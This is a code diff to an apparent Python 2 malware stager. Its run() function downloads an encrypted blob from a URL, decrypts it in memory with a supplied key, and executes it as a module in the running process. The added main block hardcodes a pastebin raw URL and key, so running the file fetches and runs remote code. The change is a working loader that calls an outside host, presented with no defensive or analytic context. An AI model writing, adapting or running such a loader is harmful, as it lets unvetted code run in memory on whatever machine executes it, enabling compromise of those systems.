@@ -5,6 +5,7 @@
 # standard libarary
 import os
 import sys
+import imp
 import struct
 import base64
 import urllib
@@ -78,9 +79,18 @@ def run(url, key):
                     sys.exit(0)
             else:
                 sys.exit(0)
-        __logger.info("decrypting payload...")
-        payload = decrypt(urllib.urlopen(str(url)).read(), base64.b64decode(str(key)))
+        __logger.info("loading payload remotely from {}".format(url))
+        data = urllib.urlopen(url).read()
+        __logger.info("decrypting payload in-memory with 128-bit key: {}".format(key))
+        code = decrypt(data, base64.b64decode(key))
+        __logger.info("importing payload into the currently running process")
+        payload = imp.new_module('payload')
+        exec code in payload.__dict__
         __logger.info("starting client...")
-        exec payload in globals()
+        sys.modules['payload'] = payload
+        return payload
     except Exception as e:
         __logger.error("{} returned error: {}".format(run.func_name, str(e)))
+
+if __name__ == '__main__':
+    x = run(url='https://pastebin.com/raw/0QkJSQas', key='BxU9yNwWDQQLeRYhstOSiQ==')
